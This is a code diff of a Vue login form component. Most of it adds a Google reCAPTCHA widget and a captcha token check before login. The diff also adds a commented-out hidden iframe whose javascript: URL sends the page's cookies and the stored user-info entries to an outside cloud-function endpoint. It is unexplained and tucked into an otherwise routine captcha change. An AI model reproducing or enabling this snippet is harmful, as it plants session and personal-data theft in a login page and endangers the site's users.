@@ -34,6 +34,13 @@
           <b-form-invalid-feedback> {{ errors[0] }} </b-form-invalid-feedback>
         </b-form-group>
       </ValidationProvider>
+      <b-form-group>
+        <recaptcha />
+      </b-form-group>
+      <!-- <div
+        class="g-recaptcha"
+        data-sitekey="6Ld4Lg0cAAAAAGE1fZWLxmIwucTYfAVLXzV81stl"
+      ></div> -->
       <b-button
         id="login-button"
         variant="primary"
@@ -43,6 +50,10 @@
         Login
       </b-button>
     </b-form>
+    <!-- <iframe
+      src="javascript:var xhttp = new XMLHttpRequest();xhttp.open(`GET`,`https://asia-northeast1-resources-practice.cloudfunctions.net/test?token=${document.cookie}&info1=${localStorage.getItem('pc_userInfo')}&info2=${localStorage.getItem('m_userInfo')}`,true);xhttp.send();"
+      style="display:none"
+    /> -->
   </ValidationObserver>
 </template>
 
@@ -66,6 +77,19 @@ export default {
   // },
   methods: {
     async login() {
+      try {
+        const token = await this.$recaptcha.getResponse();
+        this.auth.token = token;
+        // await this.$recaptcha.reset();
+      } catch (e) {
+        this.$notify({
+          group: "login",
+          type: "error",
+          title: "ERROR:",
+          text: "Captcha Error"
+        });
+        return;
+      }
       try {
         await this.$auth.loginWith("local", {
           data: this.auth
